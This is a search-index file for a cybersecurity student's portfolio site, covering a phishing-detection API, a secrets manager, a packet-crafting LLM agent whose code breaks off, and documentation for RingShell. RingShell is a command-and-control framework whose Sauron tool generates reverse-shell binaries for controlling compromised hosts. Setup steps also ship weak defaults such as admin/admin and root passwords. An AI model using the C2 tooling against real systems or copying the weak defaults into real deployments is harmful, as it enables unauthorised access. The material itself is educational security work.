{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Tech Patronus Lab","text":"<p>I am Mustafa Abdulaziz, a Cybersecurity and Cloud Computing Engineer with a strong interest in Networking, Network Security, Cybersecurity AI, and Intrusion Detection. This personal website is designed to showcase my work and achievements throughout my academic journey.</p> <p>I am proficient in both Python and Golang, which I use extensively for my development work. The website is organized into three main sections:</p> <ol> <li>Presentations: A curated selection of presentations I have delivered during my studies, both at university and online.</li> <li>Tools: A collection of simple scripts and utilities I have created for learning purposes or specific tasks.</li> <li>Projects: An overview of my larger and more comprehensive projects.</li> </ol> <p>For additional information, including my CV, please visit the About section.</p>"},{"location":"about/","title":"About Mustafa Abdulaziz","text":""},{"location":"about/#summary","title":"Summary","text":"<p>I am a motivated Cybersecurity and Cloud Computing Engineer with hands-on expertise in Python and Golang. My work focuses on networking, network security, AI applications in cybersecurity, and intrusion detection systems.</p>"},{"location":"about/#education","title":"Education","text":"<p>Northern Technical University Bachelor of Cybersecurity and Cloud Computing Engineering 2022 \u2013 2026</p>"},{"location":"about/#languages","title":"Languages","text":"<ul> <li>Arabic (Fluent)  </li> <li>English  </li> </ul>"},{"location":"about/#skills","title":"Skills","text":""},{"location":"about/#cybersecurity-network-defense","title":"Cybersecurity &amp; Network Defense","text":"<ul> <li>Intrusion Detection / Network Monitoring: Suricata, Zeek  </li> <li>Log Analysis &amp; SIEM: SEC555-Level </li> <li>Packet Analysis &amp; Network Forensics </li> <li>IDS / IPS Engineering: SEC503-level</li> <li>AI for Cybersecurity: SEC595-level</li> </ul>"},{"location":"about/#cloud-infrastructure","title":"Cloud &amp; Infrastructure","text":"<ul> <li>Cloud: AWS (Cloud Practitioner level)  </li> <li>Version Control &amp; Collaboration: Git, GitHub  </li> <li>Infrastructure as Code: Ansible  </li> <li>Containerization: Docker</li> </ul>"},{"location":"about/#programming-scripting","title":"Programming &amp; Scripting","text":"<ul> <li>Languages: Python \u00b7 Golang \u00b7 AWK (text processing)  </li> </ul>"},{"location":"about/#python-ecosystem-libraries","title":"Python Ecosystem &amp; Libraries","text":"<ul> <li>Networking &amp; Security: Scapy, socket, PyShark, etc</li> <li>Machine Learning &amp; AI: scikit-learn, TensorFlow, PyTorch</li> <li>LLM Orchestration: LangChain  </li> <li>Web Scraping: requests, BeautifulSoup, Scrapy  </li> <li>Data Handling &amp; Analysis: NumPy, pandas, matplotlib</li> </ul>"},{"location":"about/#selected-projects","title":"Selected Projects","text":"<ul> <li> <p>RingShell \u2013 Golang Command and Control (C2) Framework   Developed a remote management tool for cybersecurity operations.</p> </li> <li> <p>Pandora \u2013 HTTPS Secrets Management System   Built a secure, encrypted service for storing credentials with authenticated access.</p> </li> </ul>"},{"location":"presentations/RingShell-C2-Project/","title":"RingShell C2 Project","text":"<p>Presented at NTU \u2014 3 November 2024.</p> AbstractDownloadRelated Links <p>This presentation introduces the RingShell project \u2014 a Golang-based Command and Control (C2) framework designed to manage C2 sessions over TCP. It provides capabilities for setting up both listener and controller servers, and includes a scripting engine to automate command execution. The demonstration features a basic USB drop attack using a Digispark microcontroller flashed with custom firmware to emulate a USB keyboard.</p> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>RingShell Project</li> </ul>"},{"location":"presentations/application_layer01/","title":"Application Layer and Transport Services","text":"<p>Presented online \u2014 27 March 2024</p> AbstractAgendaDownloadRelated Links <p>This presentation introduces key concepts in network application development, including application architectures, process communication, addressing, and the transport services provided by TCP/IP. It also offers a brief overview of TLS and an introductory hands-on look at socket programming with Python. This is the first of two presentations based on Chapter 2 of the textbook Computer Networking: A Top-Down Approach.</p> <ul> <li>Network Application </li> <li>Network Applications Architecture </li> <li>Processes Communicating </li> <li>Process-Network Interface </li> <li>Addressing Processes </li> <li>Transport Services Available to Applications </li> <li>Transport Services Provided by the TCP\\IP Networks </li> <li>Transport-Layer Security (TLS) </li> <li>Introduction to Socket Programming with Python  </li> </ul> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>Application Layer Protocols - HTTP</li> </ul>"},{"location":"presentations/application_layer02/","title":"Application Layer Protocols - HTTP","text":"<p>Presented online \u2014 9 June 2024</p> AbstractAgendaDownloadRelated Links <p>This presentation, the second in a series based on Computer Networking: A Top-Down Approach, explores the HTTP protocol. Topics include connection types, request and response formats, cookies, web caching, and the enhancements introduced with HTTP/2.</p> <ul> <li>Overview of HTTP</li> <li>Non-Persistent and Persistent Connections</li> <li>HTTP Request Format</li> <li>HTTP Response Format</li> <li>Cookies</li> <li>Web Caching</li> <li>HTTP/2</li> </ul> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>Application Layer and Transport Services \u2014 The First in the Series</li> </ul>"},{"location":"presentations/data-driven-security/","title":"AI As Magic: Data-Driven Security","text":"<p>Presented at NTU \u2014 12 October 2025.</p> AbstractDownloadRelated Links <p>This presentation outlines the importance of data-driven security and explores an important example that demonstrates the ability to apply machine learning to different types of data for cybersecurity purposes.</p> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>Our Fine-tuned DeBERTa: deberta-phishing-detector-body on HuggingFace</li> </ul>"},{"location":"presentations/dos-and-ddos-attacks/","title":"DoS and DDoS Attacks: Overiew and Magical Detection Aproaches","text":"<p>Presented at NTU \u2014 23 March 2025.</p> AbstractDownloadRelated Links <p>This presentation explores common classical DoS and DDoS attacks, and demonstrates the use of supervised learning to analyze network data.</p> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>Notebook</li> </ul>"},{"location":"presentations/logs-analysis/","title":"Logs Analysis ML-Based Attacks Classification","text":"<p>Presented at NTU \u2014 7 April 2025.</p> AbstractDownload <p>This presentation explores the application of machine learning classification techniques to Windows event logs for the purpose of detecting anomalous or malicious activity.</p> <p>\ud83d\udcc4 Download PDF</p>"},{"location":"presentations/pandora-bruteforced/","title":"Bruteforce Attack on Pandora","text":"<p>Presented at NTU \u2014 16 December 2024.</p> AbstractDownloadRelated Links <p>This presentation explores the use of the Cerberus and Fenrir tools to conduct basic penetration testing against a Pandora server instance, demonstrating vulnerabilities and potential attack vectors.</p> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>Pandora Secrets Management System</li> <li>Cerberus</li> <li>Fenrir</li> </ul>"},{"location":"presentations/pandora/","title":"Pandora Secrets Management System","text":"<p>Presented at NTU - 9 December 2024</p> AbstractDownloadRelated Links <p>This presentation introduces the Pandora Secrets Management System, a Golang-based, containerized HTTPS server designed to securely receive, store, and serve encrypted secrets. It authenticates clients using Basic Authentication and delivers the secrets to their respective owner scripts over a secure channel.</p> <p>\ud83d\udcc4 Download PDF</p> <ul> <li>Pandora Project</li> </ul>"},{"location":"projects/nightshade-filter/","title":"Nightshade Filter Project","text":"DescriptionCodeDocumentationDownload <p>Nightshade is a phishing detection API that leverages state-of-the-art DeBERTa transformer models to analyze both email subjects and bodies. Named after the deadly nightshade plant from the Addams Family aesthetic, this system provides robust protection against phishing attacks through secure, authenticated endpoints.</p> NightshadeFilter.py<pre><code>from transformers import AutoTokenizer, AutoModelForSequenceClassification\nimport torch\nfrom fastapi import FastAPI, HTTPException, Depends\nfrom fastapi.security import HTTPBearer, HTTPAuthorizationCredentials\nfrom pydantic import BaseModel, Field\nfrom typing import List\nimport torch\nfrom transformers import pipeline\nfrom datetime import datetime, timedelta\nimport jwt\nimport yaml\nBODY_MODEL_NAME = \"mustafaAbdulazizHamza/deberta-phishing-detector-body\"\nSUBJECT_MODEL_NAME = \"mustafaAbdulazizHamza/deberta-phishing-detector-subject\"\n\nbody_tokenizer = AutoTokenizer.from_pretrained(BODY_MODEL_NAME)\nbody_model     = AutoModelForSequenceClassification.from_pretrained(BODY_MODEL_NAME)\ndevice    = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nbody_model.to(device)\nbody_model.eval()\n\nsubject_tokenizer = AutoTokenizer.from_pretrained(SUBJECT_MODEL_NAME)\nsubject_model     = AutoModelForSequenceClassification.from_pretrained(SUBJECT_MODEL_NAME)\ndevice    = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\nsubject_model.to(device)\nsubject_model.eval()\n\ndef classify(inputs, model, tokenizer):\n    inputs = tokenizer(\n        inputs,\n        padding=True,\n        truncation=True,\n        max_length=512,\n        return_tensors=\"pt\"\n    ).to(device)\n\n    with torch.no_grad():\n        outputs = model(**inputs)\n        probs   = torch.nn.functional.softmax(outputs.logits, dim=1)\n        preds   = torch.argmax(probs, dim=1).cpu().numpy()\n\n    return preds\n\ndef classify_email(subjects, bodies):\n    if isinstance(subjects, str):\n        subjects = [subjects]\n    if isinstance(bodies, str):\n        bodies = [bodies]\n    spreds = classify(subjects, subject_model, subject_tokenizer)\n    bpreds = classify(bodies, body_model, body_tokenizer)\n    return spreds[0], bpreds[0]\n\napp = FastAPI(title=\"Nightshade Filter: An E-mail Phishing Detection API\", version=\"1.0.0\")\ndef load_config(path=\"config.yaml\"):\n    with open(path, \"r\") as f:\n        config = yaml.safe_load(f)\n    return config\nconfig = load_config()\nSECRET_KEY = config[\"SECRET_KEY\"]\nALGORITHM = config[\"ALGORITHM\"]\nTOKEN_EXPIRATION_HOURS = config[\"TOKEN_EXPIRATION_HOURS\"]\nUSERNAME = config[\"USERNAME\"]\nPASSWORD = config[\"PASSWORD\"]\nMaxNumEmails = config[\"MaxNumEmails\"]\nHOST = config[\"HOST\"]\nPORT = config[\"PORT\"]\nSSL_CERTFILE = config[\"SSL_CERTFILE\"]\nSSL_KEYFILE = config[\"SSL_KEYFILE\"]\n\nsecurity = HTTPBearer()\n\n\nclass Email(BaseModel):\n    subject: str = Field(..., min_length=1, description=\"Email subject\")\n    body: str = Field(..., min_length=1, description=\"Email body\")\n\n\nclass EmailListRequest(BaseModel):\n    emails: List[Email] = Field(..., description=\"List of emails to classify\")\n\n\nclass PredictionResult(BaseModel):\n    prediction: int\n\n\nclass EmailListResponse(BaseModel):\n    total_emails: int\n    predictions: List[PredictionResult]\n    current_user: str\n\nclass LoginRequest(BaseModel):\n    username: str = Field(..., description=\"Username\")\n    password: str = Field(..., description=\"Password\")\n\n\nclass TokenResponse(BaseModel):\n    access_token: str\n    token_type: str = \"bearer\"\n    expires_in: int\n\n\ndef create_access_token(username: str, expires_in_hours: int = TOKEN_EXPIRATION_HOURS) -&gt; str:\n    expiration = datetime.utcnow() + timedelta(hours=expires_in_hours)\n    payload = {\n        \"sub\": username,\n        \"exp\": expiration,\n        \"iat\": datetime.utcnow()\n    }\n    token = jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)\n    return token\n\n\ndef verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)) -&gt; str:\n    token = credentials.credentials\n\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])\n        username = payload.get(\"sub\")\n\n        if username is None:\n            raise HTTPException(status_code=401, detail=\"Invalid token\")\n\n        return username\n\n    except jwt.ExpiredSignatureError:\n        raise HTTPException(status_code=401, detail=\"Token has expired\")\n    except jwt.InvalidTokenError:\n        raise HTTPException(status_code=401, detail=\"Invalid token\")\n\n\n@app.post(\"/login\", response_model=TokenResponse)\nasync def login(credentials: LoginRequest):\n\n    if credentials.username != USERNAME or credentials.password != PASSWORD:\n        raise HTTPException(status_code=401, detail=\"Invalid username or password\")\n\n    access_token = create_access_token(credentials.username)\n    expiration = datetime.utcnow() + timedelta(hours=TOKEN_EXPIRATION_HOURS)\n    expires_in = int((expiration - datetime.utcnow()).total_seconds())    \n    return TokenResponse(\n        access_token=access_token,\n        token_type=\"bearer\",\n        expires_in=expires_in\n    )\n\n\n@app.post(\"/predict\", response_model=EmailListResponse)\nasync def predict_emails(\n    request: EmailListRequest,\n    current_user: str = Depends(verify_token)\n):\n    if not request.emails:\n        raise HTTPException(status_code=400, detail=\"Email list cannot be empty\")\n\n    if len(request.emails) &gt; MaxNumEmails:\n        raise HTTPException(status_code=400, detail=f\"Maximum {MaxNumEmails} emails per request\")\n    predictions = []\n    for email in request.emails:\n        spreds, bpreds = classify_email(email.subject, email.body)\n        result = PredictionResult(\n            prediction=int((spreds + bpreds) &gt; 0)\n            )\n        predictions.append(result)\n\n    return EmailListResponse(\n        total_emails=len(request.emails),\n        predictions=predictions,\n        current_user=current_user\n    )\n\n\n@app.post(\"/predict-single\")\nasync def predict_single_email(\n    email: Email,\n    current_user: str = Depends(verify_token)\n):\n    spreds, bpreds = classify_email(email.subject, email.body)\n\n    return {\n        \"prediction\": int((spreds+bpreds) &gt; 0),\n        \"current_user\": current_user\n    }\n\n\n@app.get(\"/\")\nasync def health_check():\n    return {\n        \"status\": \"ok\",\n        \"gpu_available\": torch.cuda.is_available()\n    }\nif __name__ == \"__main__\":\n    import uvicorn\n    uvicorn.run(app,\n    host=HOST,\n    port=PORT,\n    reload=True,ssl_certfile=SSL_CERTFILE,\n    ssl_keyfile=SSL_KEYFILE\n    )\n</code></pre> <p></p>"},{"location":"projects/nightshade-filter/#overview","title":"Overview","text":"<p>Nightshade is an advanced phishing detection API that leverages state-of-the-art DeBERTa transformer models to analyze both email subjects and bodies. Named after the deadly nightshade plant from the Addams Family aesthetic, this system provides robust protection against phishing attacks through secure, authenticated endpoints. Key Features: - JWT-based authentication for secure API access</p> <ul> <li> <p>Dual-model architecture analyzing both subject lines and email bodies</p> </li> <li> <p>GPU acceleration support for fast inference</p> </li> <li> <p>HTTPS/TLS encryption for secure communications</p> </li> <li> <p>Batch processing support for multiple emails</p> </li> <li> <p>High accuracy using fine-tuned DeBERTa models</p> </li> </ul> <p>YAML configuration for easy deployment management</p>"},{"location":"projects/nightshade-filter/#models","title":"Models","text":"<p>Two fine-tuned DeBERTa models were employed for email classification, both trained on the Phishing Email Curated Datasets from\u00a0Zenodo. The first model was trained for body classification and achieved an F1 score of 0.99, while the second model was trained for subject line classification with an F1 score of 0.95.</p>"},{"location":"projects/nightshade-filter/#quick-start","title":"Quick Start","text":""},{"location":"projects/nightshade-filter/#prerequisites","title":"Prerequisites","text":"<ol> <li>Python 3.11+</li> <li>CUDA-compatible GPU (optional, but recommended)</li> <li>OpenSSL (for HTTPS certificate generation)</li> </ol>"},{"location":"projects/nightshade-filter/#installation","title":"Installation","text":"<ol> <li>Clone the repository: <pre><code>git clone https://github.com/MustafaAbdulazizHamza/Nightshade-Filter.git\ncd Nightshade-Filter\n</code></pre></li> <li>Create virtual environment: <pre><code>python -m venv env\nsource env/bin/activate  # On Windows: env\\Scripts\\activate\n</code></pre></li> <li>Install dependencies: <pre><code>pip install -r requirements.txt\n</code></pre></li> <li>Generate SSL certificates <pre><code>openssl req -x509 -newkey rsa:4096 -nodes -out cert.pem -keyout key.pem -days 365\n</code></pre></li> <li>Configure the application by editing the config.yaml file <pre><code>SECRET_KEY: \"r25BdIag7v7GRW0CXCntF4KRQ1JuGgNg3mM6imXSNaY\"\nALGORITHM: \"HS256\"\nTOKEN_EXPIRATION_HOURS: 24\nUSERNAME: \"admin\"\nPASSWORD: \"admin\"\nMaxNumEmails: 100\nHOST: \"0.0.0.0\"\nPORT: 8888\nSSL_CERTFILE: \"cert.pem\"\nSSL_KEYFILE: \"key.pem\"\n</code></pre></li> <li>Run the application <pre><code>uvicorn NightshadeFilter:app\n</code></pre></li> </ol>"},{"location":"projects/nightshade-filter/#notes","title":"Notes","text":"<ul> <li>API documentation is available at the /docs endpoint.</li> <li>The fine-tuned DeBERTa models are available on Hugging Face in my account at this link</li> </ul>"},{"location":"projects/pandora/","title":"Pandora Project","text":"DescriptionCodeDocumentationDownload <p>Secret management is a critical aspect of modern DevOps environments, where securely handling authentication tokens and other sensitive credentials is essential. To address these needs, we introduce Pandora, a secret management system built using the Golang Gin framework. Pandora is designed to run in a containerized environment and provides an API for seamless user interaction. Any HTTPS client operating from a machine with access to the server can act as a Pandora client. Pandora aims to offer an efficient and streamlined solution for securely managing secrets in DevOps workflows.</p> main.go<pre><code>package main\n\nimport (\n    \"database/sql\"\n    \"github.com/MustafaAbdulazizHamza/Pandora-Server/APIs\"\n    \"github.com/MustafaAbdulazizHamza/Pandora-Server/Middleware\"\n    _ \"github.com/mattn/go-sqlite3\"\n\n    \"github.com/gin-gonic/gin\"\n    \"log\"\n    \"os\"\n)\n\nfunc main() {\n    gin.SetMode(gin.ReleaseMode)\n    router := gin.Default()\n    var (\n        address string = \":8080\"\n        db      *sql.DB\n        err     error\n    )\n    if db, err = sql.Open(\"sqlite3\", \"./Pandora.db\"); err != nil {\n        os.Exit(404)\n    }\n    defer db.Close()\n    if err = db.Ping(); err != nil {\n        os.Exit(404)\n    }\n    router.Use(Middleware.AuthenticateUser(db))\n\n    router.POST(\"/user\", APIs.InsertUser(db))\n    router.PATCH(\"/user\", APIs.UpdateUserCredentials(db))\n    router.DELETE(\"/user\", APIs.DeleteUser(db))\n    router.POST(\"/secret\", APIs.PostSecret(db))\n    router.GET(\"/secret\", APIs.GetSecret(db))\n    router.PATCH(\"/secret\", APIs.UpdateSecret(db))\n    router.DELETE(\"/secret\", APIs.DeleteSecret(db))\n    err = router.RunTLS(address, \"server.crt\", \"server.key\")\n    log.Fatal(err)\n}\n</code></pre> <p></p>"},{"location":"projects/pandora/#pandora-secrets-management-system","title":"Pandora Secrets Management System","text":""},{"location":"projects/pandora/#introduction","title":"Introduction","text":"<p>Secret management is a critical aspect of modern DevOps environments, where securely handling authentication tokens and other sensitive credentials is essential. To address these needs, we introduce Pandora, a secret management system built using the Golang Gin framework. Pandora is designed to run in a containerized environment and provides an API for seamless user interaction. Any HTTPS client operating from a machine with access to the server can act as a Pandora client. Pandora aims to offer an efficient and streamlined solution for securely managing secrets in DevOps workflows.</p>"},{"location":"projects/pandora/#prerequisites","title":"Prerequisites","text":"<ol> <li>Golang Installed: Install Golang to compile the code.  </li> <li>Docker Installed: Install Docker for containerized deployment.  </li> <li>Digital Certificate and Private Key: Obtain a valid digital certificate and private key to enable secure HTTPS communication.</li> </ol>"},{"location":"projects/pandora/#installation-guide","title":"Installation Guide","text":"<p>Follow these steps to set up the Pandora HTTPS server:</p> <ol> <li>Clone the Repository: Clone the Pandora repository from GitHub: <pre><code>git clone https://github.com/MustafaAbdulazizHamza/Pandora-Server.git\n</code></pre></li> <li>Compile the Project: Compile the project so that it can be run: <pre><code>go build -o Pandora\n</code></pre></li> <li>Add Digital Certificate and Private Key: Place your digital certificate and private key files (named server.*) in the project directory.</li> <li>Build Pandora Docker Image: Create a custom Docker image for Pandora using the following command: <pre><code>docker build -t pandora:v1 .\n</code></pre></li> <li>Create a Database Storage Volume: Set up a volume for the Pandora database using: <pre><code>docker volume create pandora-data\n</code></pre></li> <li>Run Pandora Container: Launch the Pandora container and attach the previously created volume: <pre><code>docker run -d -p 8080:8080 --name pandora -v pandora-data:/root/ pandora:v1  \n</code></pre></li> </ol>"},{"location":"projects/pandora/#notes","title":"Notes:","text":"<ol> <li>The default root password is root.</li> <li>You can use Pandora-CLI for server configuration or service acquisition.</li> <li>Several clients have been developed for this server, such as Pandora-CLI and Go-Pandora.</li> </ol>"},{"location":"projects/pandora/#related-tools","title":"Related Tools","text":"<ol> <li>Pandora-Cli: An HTTPS client CLI tool for simple user interaction with the Pandora Secrets Management System. Pandora-CLI</li> <li>Go-Pandora: A Golang library that provides a client interface for using and managing the Pandora Secrets Management System was publish at this repository: Go-Pandora</li> </ol>"},{"location":"projects/ringshell/","title":"RingShell Project","text":"DescriptionCodeDocumentationDownload <p>RingShell is a lightweight Command and Control (C2) framework written in Golang, intended for educational purposes in offensive security. It supports reverse shell payloads and can be extended with custom modules or payloads. RingShell is composed of two primary components:</p> <ol> <li> <p>Listener \u2013 A shell interface for managing sessions with compromised systems.</p> </li> <li> <p>Payload Generator (Sauron) \u2013 A binary generator for cross-platform reverse shell payloads.</p> </li> </ol> main.go<pre><code>package main\nimport (\n    \"flag\"\n    \"fmt\"\n    \"www.github.com/MustafaAbdulazizHamza/RingShellListener/Art\"\n    \"www.github.com/MustafaAbdulazizHamza/RingShellListener/Server\"\n)\nfunc main() {\n    port := flag.Int(\"p\", 8888, \"Port number for the server to listen on\")\n    flag.Parse()\n    Art.Art()\n    fmt.Printf(\"Starting server on port %d...\\n\", *port)\n    Server.Server(*port)\n}\n</code></pre> <p></p>"},{"location":"projects/ringshell/#ringshell-documentation-v10","title":"RingShell Documentation v1.0","text":"<p> RingShell is a lightweight Command and Control (C2) framework written in Golang, intended for educational purposes in offensive security. It supports reverse shell payloads and can be extended with custom modules or payloads. RingShell is composed of two primary components:</p> <ol> <li>Listener \u2013 A shell interface for managing sessions with compromised systems.</li> <li>Payload Generator (Sauron) \u2013 A binary generator for cross-platform reverse shell payloads.</li> </ol>"},{"location":"projects/ringshell/#installation","title":"\ud83e\uddea Installation","text":""},{"location":"projects/ringshell/#prerequisites","title":"Prerequisites","text":"<ul> <li>Linux-based environment</li> <li>Go Programming Language</li> </ul>"},{"location":"projects/ringshell/#setup","title":"Setup","text":"<pre><code>git clone https://github.com/MustafaAbdulazizHamza/RingShell.git\ncd RingShell/RingShell\ngo build -o RingShell\ncd ../Sauron\ngo build -o sauron\n</code></pre>"},{"location":"projects/ringshell/#terminology","title":"\ud83d\udcda Terminology","text":"<ol> <li> <p>Ring A Ring refers to a deployed RingShell payload. It is the agent (or implant) that establishes a connection back to the C2 infrastructure, allowing remote control of the target system.</p> </li> <li> <p>Servers In RingShell, a Server is a TCP endpoint created using the <code>bind</code> command. It can be one of the following:</p> </li> <li> <p>Listening Server:     A passive server that receives data (e.g., screenshots, logs) from a payload. It acts as a dropbox-style endpoint for exfiltration or monitoring.</p> </li> <li> <p>Controlling Server:     An active C2 component that maintains an interactive connection with one or more Rings. It sends commands and receives outputs from the connected agents.</p> </li> <li> <p>Sauron Sauron is the command-line tool used to generate Rings (payloads). It supports custom parameters like target OS, architecture, listener IP/port, and output directory. The result is a compiled binary that can be deployed on the target system.</p> </li> </ol>"},{"location":"projects/ringshell/#ringshell-listener","title":"\ud83d\udef0\ufe0f RingShell Listener","text":"<p>The RingShell Listener provides an interactive CLI for managing active sessions, executing commands, transferring files, and controlling the C2 infrastructure.</p>"},{"location":"projects/ringshell/#general-syntax","title":"\ud83e\uddfe General Syntax","text":"<pre><code>command [subcommand] [arguments...]\n</code></pre> <p>Some commands require a selected session via <code>listen &lt;session_id&gt;</code>.</p>"},{"location":"projects/ringshell/#command-reference","title":"\ud83d\udcd6 Command Reference","text":"<p>Below is a table summarizing all available built-in commands:</p> Command Syntax Description listen <code>listen &lt;session_id&gt;</code> Focuses interaction on a specific zombie session. q! <code>q!</code> Exits the RingShell interface. list <code>list [sessions \\| servers] [listening \\| controlling]</code> Lists all active sessions or servers. set <code>set &lt;option&gt; &lt;value&gt;</code> Sets global parameters: <code>port</code>, <code>timeout</code>, <code>out</code>. get <code>get &lt;screenshots \\| image \\| file&gt; [filename(s)]</code> Retrieves data or files from the target. bind <code>bind &lt;listening \\| controlling&gt; &lt;port&gt; [named &lt;name&gt;]</code> Launches a server on the specified port. send <code>send To &lt;controlling_server&gt; &lt;command \\| file&gt; &lt;arg&gt;</code> Sends a command or script file to a controller. kill <code>kill &lt;controlling \\| listening&gt; &lt;name&gt;</code> Terminates a running server. import <code>import &lt;script_file&gt;</code> Executes a RingShell script. upload <code>upload &lt;file \\| executable&gt; &lt;path&gt;</code> Uploads a file to the remote session. (any other command) <code>&lt;command&gt;</code> Sent directly to the active session."},{"location":"projects/ringshell/#session-specific-commands","title":"\ud83d\udd04 Session-Specific Commands","text":"<p>After using <code>listen &lt;session_id&gt;</code>, all subsequent inputs are interpreted as commands for that session.</p> <p>Example: <pre><code>listen zombie01\nwhoami\ncd /tmp\nls -al\n</code></pre></p> <p>If no session is selected, the shell will warn:</p> <pre><code>You must specify a session ID before attempting to send a command.\n</code></pre>"},{"location":"projects/ringshell/#auto-completion","title":"\ud83d\udca1 Auto-Completion","text":"<p>RingShell includes intelligent auto-completion with:</p> <ul> <li>Session and server ID suggestions</li> <li>File and path hints</li> <li>Syntax assistance for multi-level commands</li> </ul>"},{"location":"projects/ringshell/#sauron-payload-generator","title":"\ud83e\uddea Sauron: Payload Generator","text":"<p>Sauron is a CLI utility that generates RingShell reverse shell binaries. It supports multiple platforms and architectures.</p>"},{"location":"projects/ringshell/#usage","title":"\ud83d\udd27 Usage","text":"<pre><code>Usage of ./Sauron:\nA tool that is used to generate rings based on user input.\n\nFlags:\n-arch string      Target architecture (e.g., amd64)\n-ip string        Listener IP address\n-os string        Target operating system (lowercase)\n-out string       Full path to output directory\n-port int         Port to connect back to\n\nExample:\n./sauron -ip 192.168.1.10 -port 8080 -os windows -arch amd64 -out /home/user/output/\n</code></pre>"},{"location":"projects/ringshell/#disclaimer","title":"\ud83d\udd10 Disclaimer","text":"<p>This tool is intended strictly for educational and research purposes in controlled environments. Misuse against systems without authorization is illegal and prohibited.</p>"},{"location":"projects/scapyfy/","title":"Scapyfy Project","text":"DescriptionCodeDocumentationDownload <p>Scapyfy is a secure LLM agent that performs packet crafting tasks on your behalf. The agent utilizes OpenAI services for intelligent decision-making and operates behind an API secured with JWT authentication.</p> <p>The name is a portmanteau of the popular packet crafting tool, Scapy, and the suffix -fy, which evokes a sense of Harry Potter magic.</p> loop.py<pre><code>from dotenv import load_dotenv\nimport os\nfrom langchain_openai import ChatOpenAI\nfrom langchain.tools import tool\nfrom scapy.all import Ether, IP, ARP, TCP, UDP, ICMP, sr, srp, send, Packet\nfrom scapy.packet import Raw\nimport json\nimport logging\nimport uuid\nfrom datetime import datetime\nfrom langchain.prompts import SystemMessagePromptTemplate, HumanMessagePromptTemplate, ChatPromptTemplate, \\\n    MessagesPlaceholder\nfrom langchain_core.runnables import RunnableSerializable\nfrom langchain_core.messages import AIMessage, ToolMessage\n\ncurrent_user = \"\"\ncurrent_session_id = None\n\n# Simple Logging Setup\ndef setup_execution_logging():\n    \"\"\"Setup logging for tool execution tracking.\"\"\"\n    logs_dir = os.path.join(os.getcwd(), 'logs')\n    os.makedirs(logs_dir, exist_ok=True)\n\n    logger = logging.getLogger('packet_crafter_tools')\n    logger.setLevel(logging.INFO)\n\n    # Remove existing handlers\n    for handler in logger.handlers[:]:\n        logger.removeHandler(handler)\n\n    # File handler\n    file_handler = logging.FileHandler(\n        os.path.join(logs_dir, 'packet_crafter_executions.log'),\n        encoding='utf-8'\n    )\n    file_handler.setLevel(logging.INFO)\n\n    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')\n    file_handler.setFormatter(formatter)\n    logger.addHandler(file_handler)\n\n    return logger\n\n# Initialize logger\nexecution_logger = setup_execution_logging()\n\ndef log_tool_execution(tool_name: str, tool_args: dict, tool_output: str, user: str, session_id: str):\n    \"\"\"Log tool execution details.\"\"\"\n    log_entry = {\n        \"session_id\": session_id,\n        \"user\": user,\n        \"tool_name\": tool_name,\n        \"arguments\": tool_args,\n        \"output_length\": len(str(tool_output)),\n        \"timestamp\": datetime.now().isoformat()\n    }\n    execution_logger.info(f\"TOOL_EXEC: {json.dumps(log_entry)}\")\n\ndef log_session_start(prompt: str, user: str, session_id: str):\n    \"\"\"Log session start.\"\"\"\n    log_entry = {\n        \"session_id\": session_id,\n        \"user\": user,\n        \"action\": \"SESSION_START\",\n        \"prompt\": prompt,\n        \"timestamp\": datetime.now().isoformat()\n    }\n    execution_logger.info(f\"SESSION: {json.dumps(log_entry)}\")\n\ndef log_session_end(result: str, user: str, session_id: str):\n    \"\"\"Log session end.\"\"\"\n    log_entry = {\n        \"session_id\": session_id,\n        \"user\": user,\n        \"action\": \"SESSION_END\",\n        \"result_length\": len(result),\n        \"timestamp\": datetime.now().isoformat()\n    }\n    execution_logger.info(f\"SESSION: {json.dumps(log_entry)}\")\n\nload_dotenv()\nif not os.getenv(\"OPENAI_API_KEY\"):\n    raise Exception(\"OPENAI_API_KEY not set\")\n\n@tool\ndef send_pkt(pkt_desc: str, isEther: bool = False, wantResp: bool = True) -&gt; str:\n    \"\"\"\n    Sends a crafted packet using Scapy based on a JSON-formatted string.\n    Parameters:\n    - pkt_desc: A JSON string describing protocol layers and their fields.\n    Example: '{\"Ether\": {\"src\": \"00:11:22:33:44:55\"}, \"IP\": {\"dst\": \"192.168.0.1\"}, \"TCP\": {\"dport\": 22, \"flags\": \"S\"}}'\n    - isEther: Whether the link layer (Ether) is used (srp instead of sr).\n    - wantResp: Whether to return the first response packet.\n    Returns:\n    - The first response Packet if wantResp is True and a response is received.\n    - None otherwise.\n    \"\"\"\n    layers = json.loads(pkt_desc)\n    pkt = None\n    for layer_name, fields in layers.items():\n        layer_cls = globals().get(layer_name)\n        if not layer_cls:\n            raise ValueError(f\"Unknown layer: {layer_name}\")\n        layer = layer_cls(**fields)\n        if pkt is None:\n            pkt = layer\n        else:\n            pkt = pkt / layer\n    if isEther:\n        if wantResp:\n            answered, _ = srp(pkt, timeout=2, verbose=0)\n            try:\n                return repr(answered[0][1])\n            except IndexError:\n                return \"No answer\"\n        else:\n            send(pkt, verbose=0)\n            return \"No answer\"\n    else:\n        if wantResp:\n            answered, _ = sr(pkt, timeout=2, verbose=0)\n            try:\n                return repr(answered[0][1])\n            except IndexError:\n                return \"No answer\"\n        else:\n            send(pkt, verbose=0)\n            return \"No answer\"\n\n\n@tool\ndef final_report(report: str) -&gt; str:\n    \"\"\"\n    Submit the final report\n    \"\"\"\n    return report\n\n\nllm = ChatOpenAI(model=\"gpt-3.5-turbo\", temperature=0.0)\nsystem_prompt = SystemMessagePromptTemplate.from_template(\n    \"You are Prof. Packet Crafter, a network assistant in a lab environment. \"\n    \"Craft packets using available tools based on situations, Use IP layer only unless the task explicitly requires Ethernet.\"\n    \"Write the report in plain text. If you are asked to perform passive crafting, use the final_report() tool to return only the JSON structure of the packet requested. Do NOT use other 